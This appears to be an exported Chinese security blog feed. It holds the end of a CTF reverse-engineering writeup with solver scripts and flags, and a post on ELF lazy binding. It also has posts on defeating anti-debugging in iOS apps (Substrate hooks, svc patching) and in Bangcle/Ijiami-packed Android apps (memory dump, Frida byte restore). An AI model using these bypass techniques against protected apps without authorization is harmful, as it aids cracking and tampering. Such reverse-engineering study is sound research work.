<pre><code>tmpans=779852816
tmp=123456
mod=1000000007
i=1
for i in xrange(1,1000000):
    if(i*tmp%mod==tmpans):
        print(i)
</code></pre><p>check3</p>
<p>python脚本得出符合条件的字符串是Lcont=gpfoog`q</p>
<pre><code>str1=[]
for i in range(14):
    j=i%6+1
    str1.append(j)
print(str1)

v18=&quot;MerryChristmas&quot;
list=list(v18)
for i in range(len(list)):
    list[i]=ord(list[i])
print(list)

flag=[]
for i in range(14):
    flag.append(list[i]-str1[i])
print(flag)

flag1=&quot;&quot;
for i in range(14):
    flag1+=chr(flag[i])
print(flag1)
</code></pre><p>check4</p>
<p>在OD里动态调试修改跳转最后一个符合条件的数字是176455667</p>
<p>四关都过了，最后将每一关的key输入就可以了。<br>flag is:176455667HqGpGpFoFoEnGpHqBk</p>
<h1 id="61dre"><a href="#61dre" class="headerlink" title="61dre"></a>61dre</h1><pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
{
  bool v3; // r13@2
  int v4; // eax@5
  const char *v5; // rdi@11
  size_t v6; // rax@11
  size_t v7; // rax@15
  char *v8; // rcx@15
  const char *v9; // rsi@15
  bool v10; // di@17
  const char **v12; // [sp+0h] [bp-80h]@2
  unsigned __int64 v13; // [sp+8h] [bp-78h]@11
  int v14; // [sp+14h] [bp-6Ch]@5
  char *s1; // [sp+18h] [bp-68h]@2
  const char **v16; // [sp+20h] [bp-60h]@2
  const char ***v17; // [sp+28h] [bp-58h]@2
  bool v18; // [sp+37h] [bp-49h]@2
  int *v19; // [sp+38h] [bp-48h]@2
  const char ***v20; // [sp+40h] [bp-40h]@2
  const char **v21; // [sp+48h] [bp-38h]@1
  int v22; // [sp+54h] [bp-2Ch]@1

  v22 = argc;
  v21 = argv;
  if ( !(((unsigned __int8)((y &lt; 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) | (y &lt; 10
                                                                               &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) &amp; 1) )
    goto LABEL_20;
  while ( 1 )
  {
    v12 = v21;
    v3 = (((_BYTE)x - 106 + 105) * (_BYTE)x &amp; 1) == 0;
    v20 = &amp;v12 - 2;
    v19 = (int *)&amp;v12;
    v18 = (_DWORD)v21 != 2;
    v17 = &amp;v12;
    v16 = (const char **)&amp;v12;
    s1 = (char *)(&amp;v12 - 6);
    if ( ((y &lt; 10 &amp;&amp; v3) | (unsigned __int8)((y &lt; 10) ^ v3)) &amp; 1 )
      break;
LABEL_20:
    LODWORD(v12) = 0;
    *((_DWORD *)&amp;v12 - 4) = v22;
    *(&amp;v12 - 2) = v21;
  }
  if ( v18 )
  {
    while ( !(((unsigned __int8)((y &lt; 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) | (y &lt; 10
                                                                                    &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) &amp; 1) )
      ;
LABEL_5:
    v4 = printf(&quot;Usage: %s flag\n&quot;, **v17, v12);
    *v19 = 0;
    v14 = v4;
    return *v19;
  }
  *v16 = (const char *)&amp;unk_400E54;
  if ( strlen((*v17)[1]) != 32 )
  {
    while ( !(((y &lt; 10 &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0) | (unsigned __int8)((y &gt;= 10) ^ ((((_BYTE)x - 1)
                                                                                                * (_BYTE)x &amp; 1) != 0))) &amp; 1) )
      ;
    goto LABEL_5;
  }
  if ( !(((y &lt; 10 &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0) | (unsigned __int8)((y &gt;= 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) != 0))) &amp; 1) )
    goto LABEL_23;
  while ( 1 )
  {
    *(_DWORD *)v20 = 0;
    if ( ((y &lt; 10 &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0) | (unsigned __int8)((y &gt;= 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) != 0))) &amp; 1 )
      break;
LABEL_23:
    *(_DWORD *)v20 = 0;
  }
  while ( 1 )
  {
    v5 = (*v17)[1];
    v13 = *(_DWORD *)v20;
    v6 = strlen(v5);
    if ( v13 &gt;= v6 )
      break;
    if ( !(((unsigned __int8)((y &lt; 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) | (y &lt; 10
                                                                                 &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) &amp; 1) )
      goto LABEL_24;
    while ( 1 )
    {
      s1[*(_DWORD *)v20] = (*(_BYTE *)v20 &amp; 0x89 | ~*(_BYTE *)v20 &amp; 0x76) ^ ((*v17)[1][*(_DWORD *)v20] &amp; 0x89 | ~(*v17)[1][*(_DWORD *)v20] &amp; 0x76);
      if ( ((unsigned __int8)((y &lt; 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) | (y &lt; 10
                                                                                 &amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) &amp; 1 )
        break;
LABEL_24:
      s1[*(_DWORD *)v20] = (*(_BYTE *)v20 &amp; 0x38 | ~*(_BYTE *)v20 &amp; 0xC7) ^ ((*v17)[1][*(_DWORD *)v20] &amp; 0x38 | ~(*v17)[1][*(_DWORD *)v20] &amp; 0xC7);
    }
    *(_DWORD *)v20 = *(_DWORD *)v20 - 403331085 + 403331086;
  }
  v7 = strlen((*v17)[1]);
  v8 = s1;
  s1[v7] = 0;
  v9 = *v16;
  if ( !strcmp(v8, *v16) )
    HIDWORD(v12) = printf(&quot;yes\n&quot;, v9, v12);
  do
    v10 = (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0;
  while ( !(((y &lt; 10 &amp;&amp; v10) | (unsigned __int8)((y &lt; 10) ^ v10)) &amp; 1) );
  *v19 = 0;
  return *v19;
}
</code></pre><p>代码很多，猛地一看肯定有点蒙，我也是看了人家的writeup才懂。。。<br>关键就在</p>
<pre><code>(((unsigned __int8)((y &lt; 10) ^ ((((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) | (y&lt; 10&amp;&amp; (((_BYTE)x - 1) * (_BYTE)x &amp; 1) == 0)) &amp; 1)
</code></pre><p>这段代码里的通过动态调试x，y一直都是0，这个条件始终为真。<br>那么算法逻辑接下来就是</p>
<pre><code>s1[*(_DWORD *)v20] = (*(_BYTE *)v20 &amp; 0x89 | ~*(_BYTE *)v20 &amp; 0x76) ^ ((*v17
)[1][*(_DWORD *)v20] &amp; 0x89 | ~(*v17)[1][*(_DWORD *)v20] &amp; 0x76);
</code></pre><p>最后s1与</p>
<pre><code>0x36,0x62,0x76,0x65,0x7F,0x6D,0x63,0x6B,0x64,0x66,0x55,0x7C,0x63,0x7
F,0x62,0x6B,0x4F,0x65,0x7A,0x76,0x4B,0x7A,0x74,0x71,0x79,0x6A,0x79,0x7A,0x68
,0x72,0x6C,0x62]
</code></pre><p>这串字符比较，爆破脚本如下：</p>
<pre><code>    str=[ 0x36,0x62,0x76,0x65,0x7F,0x6D,0x63,0x6B,
      0x64,0x66,0x55,0x7C,0x63,0x7F,0x62,0x6B,
      0x4F,0x65,0x7A,0x76,0x4B,0x7A,0x74,0x71,
      0x79,0x6A,0x79,0x7A,0x68,0x72,0x6C,0x62]
flag=&quot;&quot;
for i in range(len(str)):
    for j in xrange(32,128):
        if((j&amp;0x89 | ~j&amp;0x76)^(i&amp;0x89 | ~i&amp;0x76)==str[i]):
            flag=flag+chr(j)
print(flag)
</code></pre>]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>动态绕过iOS内联svc反调试</title>
    <url>/2020/04/30/%E5%8A%A8%E6%80%81%E7%BB%95%E8%BF%87iOS%E5%86%85%E8%81%94svc%E5%8F%8D%E8%B0%83%E8%AF%95/</url>
    <content><![CDATA[<p>之前在jmpews大神的<a href="http://bbs.iosre.com/t/topic/9351&quot;With a Title&quot;" target="_blank" rel="external">反调试与绕过的奇淫技巧</a>以及AloneMonkey大神的<a href="http://bbs.iosre.com/t/topic/8179" target="_blank" rel="external">关于反调试&amp;反反调试那些事</a>这两篇文章中学习到不少关于iOS反调试绕过的姿势技巧，本篇主要记录一下自己在实际逆向过程中遇到的关于svc内联反调试的绕过过程。<br><a id="more"></a></p>
<h1 id="iOS反调试简介"><a href="#iOS反调试简介" class="headerlink" title="iOS反调试简介"></a>iOS反调试简介</h1><p>iOS的反调试目前常见只有几种，主要是ptrace、sysctl、syscall几种，这里我就不照本宣科的去介绍这几种反调试的原理了，我上面提到的两位大神的文章中有十分详细的说明。</p>
<p>由于以上三种方式的反调试相对比较容易绕过，一般通过Tweak编写hook插件就可以解决了，下面贴上AloneMonkey的一个脚本，足以绕过这些反调试<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="meta">#import <span class="meta-string">&lt;substrate.h&gt;</span></span></div><div class="line"><span class="meta">#import <span class="meta-string">&lt;sys/sysctl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*orig_ptrace)</span> <span class="params">(<span class="keyword">int</span> request, <span class="keyword">pid_t</span> pid, <span class="keyword">caddr_t</span> addr, <span class="keyword">int</span> data)</span></span>;</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_ptrace</span> <span class="params">(<span class="keyword">int</span> request, <span class="keyword">pid_t</span> pid, <span class="keyword">caddr_t</span> addr, <span class="keyword">int</span> data)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span>(request == <span class="number">31</span>)&#123;</div><div class="line">		NSLog(@<span class="string">"[AntiAntiDebug] - ptrace request is PT_DENY_ATTACH"</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> orig_ptrace(request,pid,addr,data);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">void</span>* (*orig_dlsym)(<span class="keyword">void</span>* handle, <span class="keyword">const</span> <span class="keyword">char</span>* symbol);</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">my_dlsym</span><span class="params">(<span class="keyword">void</span>* handle, <span class="keyword">const</span> <span class="keyword">char</span>* symbol)</span></span>&#123;</div><div class="line">	<span class="keyword">if</span>(<span class="built_in">strcmp</span>(symbol, <span class="string">"ptrace"</span>) == <span class="number">0</span>)&#123;</div><div class="line">		NSLog(@<span class="string">"[AntiAntiDebug] - dlsym get ptrace symbol"</span>);</div><div class="line">		<span class="keyword">return</span> (<span class="keyword">void</span>*)my_ptrace;</div><div class="line">    &#125;</div><div class="line">   	<span class="keyword">return</span> orig_dlsym(handle, symbol);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="title">int</span> <span class="params">(*orig_sysctl)</span><span class="params">(<span class="keyword">int</span> * name, u_int namelen, <span class="keyword">void</span> * info, <span class="keyword">size_t</span> * infosize, <span class="keyword">void</span> * newinfo, <span class="keyword">size_t</span> newinfosize)</span></span>;</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_sysctl</span><span class="params">(<span class="keyword">int</span> * name, u_int namelen, <span class="keyword">void</span> * info, <span class="keyword">size_t</span> * infosize, <span class="keyword">void</span> * newinfo, <span class="keyword">size_t</span> newinfosize)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> ret = orig_sysctl(name,namelen,info,infosize,newinfo,newinfosize);</div><div class="line">	<span class="keyword">if</span>(namelen == <span class="number">4</span> &amp;&amp; name[<span class="number">0</span>] == <span class="number">1</span> &amp;&amp; name[<span class="number">1</span>] == <span class="number">14</span> &amp;&amp; name[<span class="number">2</span>] == <span class="number">1</span>)&#123;</div><div class="line">		<span class="keyword">struct</span> kinfo_proc *info_ptr = (<span class="keyword">struct</span> kinfo_proc *)info;</div><div class="line">        <span class="keyword">if</span>(info_ptr &amp;&amp; (info_ptr-&gt;kp_proc.p_flag &amp; P_TRACED) != <span class="number">0</span>)&#123;</div><div class="line">            NSLog(@<span class="string">"[AntiAntiDebug] - sysctl query trace status."</span>);</div><div class="line">            info_ptr-&gt;kp_proc.p_flag ^= P_TRACED;</div><div class="line">            <span class="keyword">if</span>((info_ptr-&gt;kp_proc.p_flag &amp; P_TRACED) == <span class="number">0</span>)&#123;</div><div class="line">                NSLog(@<span class="string">"[AntiAntiDebug] trace status reomve success!"</span>);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> ret;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">static</span> <span class="keyword">void</span>* (*orig_syscall)(<span class="keyword">int</span> code, va_list args);</div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span>* <span class="title">my_syscall</span><span class="params">(<span class="keyword">int</span> code, va_list args)</span></span>&#123;</div><div class="line">	<span class="keyword">int</span> request;</div><div class="line">    va_list newArgs;</div><div class="line">    va_copy(newArgs, args);</div><div class="line">    <span class="keyword">if</span>(code == <span class="number">26</span>)&#123;</div><div class="line">        request = (<span class="keyword">long</span>)args;</div><div class="line">        <span class="keyword">if</span>(request == <span class="number">31</span>)&#123;</div><div class="line">            NSLog(@<span class="string">"[AntiAntiDebug] - syscall call ptrace, and request is PT_DENY_ATTACH"</span>);</div><div class="line">            <span class="keyword">return</span> nil;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> (<span class="keyword">void</span>*)orig_syscall(code, newArgs);</div><div class="line">&#125;</div><div class="line"></div><div class="line">%ctor&#123;</div><div class="line">	MSHookFunction((<span class="keyword">void</span> *)MSFindSymbol(<span class="literal">NULL</span>,<span class="string">"_ptrace"</span>),(<span class="keyword">void</span>*)my_ptrace,(<span class="keyword">void</span>**)&amp;orig_ptrace);</div><div class="line">	MSHookFunction((<span class="keyword">void</span> *)dlsym,(<span class="keyword">void</span>*)my_dlsym,(<span class="keyword">void</span>**)&amp;orig_dlsym);</div><div class="line">	MSHookFunction((<span class="keyword">void</span> *)sysctl,(<span class="keyword">void</span>*)my_sysctl,(<span class="keyword">void</span>**)&amp;orig_sysctl);</div><div class="line">	MSHookFunction((<span class="keyword">void</span> *)syscall,(<span class="keyword">void</span>*)my_syscall,(<span class="keyword">void</span>**)&amp;orig_syscall);</div><div class="line"></div><div class="line">	NSLog(@<span class="string">"[AntiAntiDebug] Module loaded!!!"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging5.jpg" alt=""></p>
<h1 id="svc内联反调试"><a href="#svc内联反调试" class="headerlink" title="svc内联反调试"></a>svc内联反调试</h1><p>所谓svc内联其实就是通过svc汇编实现对ptrace、syscall的调用，防止攻击者直接通过hook函数绕过反调试，增加反调试绕过难度。</p>
<h2 id="如何确定iOS应用是否采用svc内联反调试"><a href="#如何确定iOS应用是否采用svc内联反调试" class="headerlink" title="如何确定iOS应用是否采用svc内联反调试"></a>如何确定iOS应用是否采用svc内联反调试</h2><p>调用svc实现ptrace的汇编如下：<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="string">"mov X0, #31"</span></div><div class="line"><span class="string">"mov X1, #0"</span></div><div class="line"><span class="string">"mov X2, #0"</span></div><div class="line"><span class="string">"mov X3, #0"</span></div><div class="line"><span class="string">"mov w16, #26"</span></div><div class="line"><span class="string">"svc #0x80"</span></div></pre></td></tr></table></figure></p>
<p>调用svc通过syscall实现ptrace的汇编如下：<br><figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="string">"mov X0, #26"</span></div><div class="line">   <span class="string">"mov X1, #31"</span></div><div class="line">   <span class="string">"mov X2, #0"</span></div><div class="line">   <span class="string">"mov X3, #0"</span></div><div class="line">   <span class="string">"mov X4, #0"</span></div><div class="line">   <span class="string">"mov w16, #0"</span></div><div class="line">   <span class="string">"svc #0x80"</span></div></pre></td></tr></table></figure></p>
<p>在动态调试iOS过程中如果遇到下面情况：<br><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging2.jpg" alt=""></p>
<p>二话不说先祭出上文的那个hook插件，如果插件不好使，直接通过IDA分析主程序在全局搜索SVC 0x80，当然也有可能不在主程序中，dylib中也是有可能的。不巧的是我在主程序中搜到了。</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging7.jpg" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging1.jpg" alt=""></p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging6.jpg" alt=""></p>
<h2 id="绕过svc反调试"><a href="#绕过svc反调试" class="headerlink" title="绕过svc反调试"></a>绕过svc反调试</h2><p>在找的这两段代码之后，想起大佬们说过遇到SVC 0x80无脑nop就好了，但是在静态情况下nop之后放入运行时程序中或者重打包安装都并不好使怎么办，不要慌，经过本人多次尝试百试百灵的办法来了。</p>
<p>反调试检测必然是在程序启动初始化的过程中，这里采取一个取巧的办法，在手机点开应用的瞬间，通过debugserver挂载该APP</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging4.jpg" alt=""></p>
<p>之后在上面找到的地址下断点，通过memory write address 0x1f 0x20 0x03 0xd5将svc指令修改为nop，将SYS_ptrace和SYS_syscall都修改完成后，删除断点，c运行发现反调试以及绕过了。</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/iOS_Anti-Debugging3.jpg" alt=""></p>
]]></content>
      <tags>
        <tag>iOS</tag>
        <tag>反调试</tag>
        <tag>反反调试</tag>
      </tags>
  </entry>
  <entry>
    <title>延迟绑定技术原理</title>
    <url>/2017/02/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<p>动态链接比静态链接灵活，但牺牲了性能，据统计ELF程序在静态链接下比动态库快大约1%~5%。<br><a id="more"></a><br>主要原因是，动态链接下对于全局和静态数据的访问都要进行复杂的GOT定位，然后间接寻址，对于模块间的调用也要先定位GOT，然后进行间接跳转。<br>另外，动态链接的链接过程是在运行时完成的，动态链接器会寻找并转载所需要的对象，然后进行符号查找地址重定位等工作。</p>
<p>延迟绑定的实现步骤如下：</p>
<p>建立一个 GOT.PLT 表，该表用来放全局函数的实际地址，但最开始时，该里面放的不是真实的地址而是一个跳转，接下来会讲。<br>对每一个全局函数，链接器生成一个与之相对应的影子函数，如 fun@plt。<br>所有对 fun 的调用，都换成对 fun@plt 的调用，每个fun@plt 长成如下样子：</p>
<pre><code>fun@plt:
jmp *(fun@got.plt)
push index
jmp _init
</code></pre><p>其中第一条指令直接从 got.plt 中去拿真实的函数地址，如果已经之前已经发生过调用，got.plt 就已经保存了真实的地址，如果是第一次调用，则 got.plt 中放的是 fun@plt 中的第二条指令，这就使得当执行第一次调用时，fun@plt中的第一条指令其实什么事也没做，直接继续往下执行，第二条指令的作用是把当前要调用的函数在 got.plt 中的编号作为参数传给 _init()，而 _init() 这个函数则用于把 fun 进行重定位，然后把结果写入到 got.plt 相应的地方，最后直接跳过去该函数。</p>
<p>仍然是使用前面的例子，我们看看 g_func2 是怎样调用 g_func 的:</p>
<pre><code>0000052f &lt;g_func2&gt;:
 52f:   55                      push   %ebp
 530:   89 e5                   mov    %esp,%ebp
 532:   53                      push   %ebx
 533:   83 ec 14                sub    $0x14,%esp
 536:   e8 00 00 00 00          call   53b &lt;g_func2+0xc&gt;
 53b:   5b                      pop    %ebx
 53c:   81 c3 91 11 00 00       add    $0x1191,%ebx
 542:   c7 45 f8 02 00 00 00    movl   $0x2,0xfffffff8(%ebp) // a = 2
 549:   83 ec 0c                sub    $0xc,%esp
 54c:   6a 03                   push   $0x3 // push argument 3 for g_func.
 54e:   e8 d5 fe ff ff          call   428 &lt;g_func@plt&gt;
 553:   83 c4 10                add    $0x10,%esp
 556:   89 45 f4                mov    %eax,0xfffffff4(%ebp)
 559:   8b 45 f4                mov    0xfffffff4(%ebp),%eax
 55c:   03 45 f8                add    0xfffffff8(%ebp),%eax
 55f:   8b 5d fc                mov    0xfffffffc(%ebp),%ebx
 562:   c9                      leave  
 563:   c3                      ret 
</code></pre><p>如上汇编，指令 536, 53b, 53c, 用于计算 got.plt 的具体位置，计算方式与前面对数据的访问原理是一样的，经计算此时, %ebx = 0x53b + 0x1191 = 0x16cc, 注意指令 54e， 该指令调用了函数 g_func@plt:</p>
<pre><code>00000428 &lt;g_func@plt&gt;:
 428:   ff a3 0c 00 00 00       jmp    *0xc(%ebx)
 42e:   68 00 00 00 00          push   $0x0
 433:   e9 e0 ff ff ff          jmp    418 &lt;_init+0x18&gt;
</code></pre><p>注意到此时， %ebx 中放的是 got.plt 的地址，g_func@plt 的第一条指令用于获取 got.plt 中 func 的具体地址， func 放在 0xc + %ebx = 0xc + 0x16cc = 0x16d8, 这个地址里放的是什么呢？我们查一下重定位表：</p>
<pre><code>-bash-3.00$ objdump -R liba.so

liba.so:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
000016e0 R_386_RELATIVE    *ABS*
000016e4 R_386_RELATIVE    *ABS*
000016bc R_386_GLOB_DAT    g_share
000016c0 R_386_GLOB_DAT    __cxa_finalize
000016c4 R_386_GLOB_DAT    _Jv_RegisterClasses
000016c8 R_386_GLOB_DAT    __gmon_start__
000016d8 R_386_JUMP_SLOT   g_func
000016dc R_386_JUMP_SLOT   __cxa_finalize
</code></pre><p>可见，该地址里放的就是 g_func 的具体地址，那此时 0x16d8 放的是真正的地址了吗？我们再看看 got.plt:</p>
<pre><code>Contents of section .got.plt:
 16cc fc150000 00000000 00000000 2e040000  ................
 16dc 3e040000 
</code></pre><p>16d8 处的内容是: 2e040000, 小端序，换回整形就是 0x000042e, 该地址就是 fun@plt 的第二条指令！</p>
]]></content>
      <tags>
        <tag>System</tag>
      </tags>
  </entry>
  <entry>
    <title>梆梆&amp;爱加密java反调试绕过</title>
    <url>/2020/05/19/%E6%A2%86%E6%A2%86-%E7%88%B1%E5%8A%A0%E5%AF%86java%E5%8F%8D%E8%B0%83%E8%AF%95%E7%BB%95%E8%BF%87/</url>
    <content><![CDATA[<p>各位道友有没有在越过重重native反调试脱掉壳之后想要调试smali的过程中突然发现在使用AndroidStdio动态调试smali的时候只要一挂载APP就会崩溃，本篇主要整理一下在调试梆梆&amp;爱加密过程中遇到的java层反调试以及绕过的方式<br><a id="more"></a></p>
<p>在将梆梆&amp;爱加密脱壳之后通过AS调试APP遇到反调试挂载失败，只要debug便会杀掉APP进程</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug9.png" alt=""></p>
<h1 id="Dalvik虚拟机下的反调试绕过"><a href="#Dalvik虚拟机下的反调试绕过" class="headerlink" title="Dalvik虚拟机下的反调试绕过"></a>Dalvik虚拟机下的反调试绕过</h1><p>虽然Dalvik已经在逐步退出市场，但是这里还是由他开始，大家都知道Dalvik的核心库是libdvm.so，在调试的过程中与APP建立连接少不了对libdvm.so的引用，因此libdvm.so几乎是最有嫌疑的地方。</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug.jpg" alt=""></p>
<h2 id="获取libdvm-so"><a href="#获取libdvm-so" class="headerlink" title="获取libdvm.so"></a>获取libdvm.so</h2><p>所谓获取libdvm.so需要获取APP未启动时libdvm.so源文件，这里只要去/system/lib目录下将其提取到本地即可。<br>其次需要加固APP运行时libdvm.so，这里我通过IDA动态挂载APP之后将其从内存中dump出来。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">auto</span> fp, begin, end, dexbyte;</div><div class="line">  fp = fopen(<span class="string">"D:\\dump.so"</span>, <span class="string">"wb"</span>);</div><div class="line">  begin = <span class="number">0x786A0000</span>;</div><div class="line">  end = begin + <span class="number">0x67000</span> ;</div><div class="line">  <span class="keyword">for</span> ( dexbyte = begin; dexbyte &lt; end; dexbyte ++ )</div><div class="line">      fputc(Byte(dexbyte), fp);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>小小脚本，不成敬意</p>
<h2 id="比较libdvm-so"><a href="#比较libdvm-so" class="headerlink" title="比较libdvm.so"></a>比较libdvm.so</h2><p>在获取到两个libdvm.so之后通过BeyondCompare进行比较</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug5.png" alt=""></p>
<p>通过比较可以看出在加固的APP运行之后，libdvm.so被改了几部分数据，并不是所有不同的地方都和反调试有关，通过IDA对照便宜去看看都改了什么地方，最终发现与java调试相关的地址为0x423B0，当然其他地方也有一些小惊喜，比如梆梆&amp;爱加密抽取函数所hook的函数什么的。</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug2.png" alt=""></p>
<p>_Z12dvmDbgActivev是java调试相关函数，主要功能是啥我也不是很清楚，有清楚的大佬希望可以留言告知一下，万分感谢。</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug7.jpg" alt=""></p>
<p>由此可见加固APP是通过hook _Z12dvmDbgActivev函数使其跳转到它自己构造的函数，并且在其中将进程kill掉防止调试。那么我们只要将Hook之后的libdvm.so再Hook修改为原函数，让其正常运行_Z12dvmDbgActivev函数，就可以绕过反调试了。</p>
<h2 id="Hook-libdvm-so"><a href="#Hook-libdvm-so" class="headerlink" title="Hook libdvm.so"></a>Hook libdvm.so</h2><p>这里通过frida hook _Z12dvmDbgActivev函数地址，打印内存，将原本函数正确内存数据写入对应地址中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="keyword">import</span> frida</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span><span class="params">(message, data)</span>:</span></div><div class="line">    print(message)</div><div class="line"></div><div class="line">redv = frida.get_remote_device()</div><div class="line">session = redv.attach(<span class="string">"com.sf.activity"</span>)</div><div class="line"></div><div class="line">src = <span class="string">"""</span></div><div class="line">    var jnibind1 = undefined;</div><div class="line">    var jnibind2 = undefined;</div><div class="line">    var jnibind3 = undefined;</div><div class="line">    var jnibind4 = undefined;</div><div class="line">    var jnibind5 = undefined;</div><div class="line">    var jnibind6 = undefined;</div><div class="line">    var jnibind7 = undefined;</div><div class="line">    var f = Module.findBaseAddress("libdvm.so");</div><div class="line">    console.log("address: " + f);</div><div class="line">    jnibind1 = f.add(0x000423C0);</div><div class="line">    var p1P = new NativePointer(jnibind1);</div><div class="line">    aryBuffer1 = Memory.readByteArray(p1P, 16);</div><div class="line">    console.log(aryBuffer1);</div><div class="line">    var vArray = [0x0D,0x4B,0x0E,0x4A,0x7B,0x44,0x10,0xB5,0x9C,0x58,0x94,0xF8,0xC6,0x33];</div><div class="line">    Memory.writeByteArray(p1P, vArray);</div><div class="line">    var p1P = new NativePointer(jnibind1);</div><div class="line">    aryBuffer1 = Memory.readByteArray(p1P, 16);</div><div class="line">    console.log(aryBuffer1);</div><div class="line">        </div><div class="line">"""</div><div class="line">script = session.create_script(src)</div><div class="line">script.on(<span class="string">"message"</span>, on_message)</div><div class="line">script.load()</div><div class="line">sys.stdin.read()</div></pre></td></tr></table></figure>
<p>frida hook之后结果</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug10.png" alt=""></p>
<p>反调试已经绕过啦！！！</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug8.png" alt=""></p>
<h1 id="Art虚拟机下的反调试绕过"><a href="#Art虚拟机下的反调试绕过" class="headerlink" title="Art虚拟机下的反调试绕过"></a>Art虚拟机下的反调试绕过</h1><h2 id="获取libart-so"><a href="#获取libart-so" class="headerlink" title="获取libart.so"></a>获取libart.so</h2><p>art虚拟机下的反调试绕过同上述的dalvik方法相同，只是关键的运行库libdvm.so替换为libart.so,同样要去/system/lib目录下将其提取到本地，这里需要注意的是在提取之前要确认运行的是libart.so还是libart64.so。</p>
<h2 id="比较libart-so"><a href="#比较libart-so" class="headerlink" title="比较libart.so"></a>比较libart.so</h2><p>在获取到两个libart.so之后通过BeyondCompare进行比较</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug6.png" alt=""></p>
<p>最终确认反调试Hook地址为0x10ABC4</p>
<p><img src="https://gitee.com/yunnigu/blog_picture/raw/master/javaDebug4.png" alt=""></p>
<p>_ZN3art3Dbg8GoActiveEv函数功能同Dalvik中_Z12dvmDbgActivev函数功能类似，绕过方法与Dalvik保持一致。</p>
<h2 id="Hook-libart-so"><a href="#Hook-libart-so" class="headerlink" title="Hook libart.so"></a>Hook libart.so</h2><p>这里通过frida hook _ZN3art3Dbg8GoActiveEv函数地址，打印内存，将原本函数正确内存数据写入对应地址中</p>
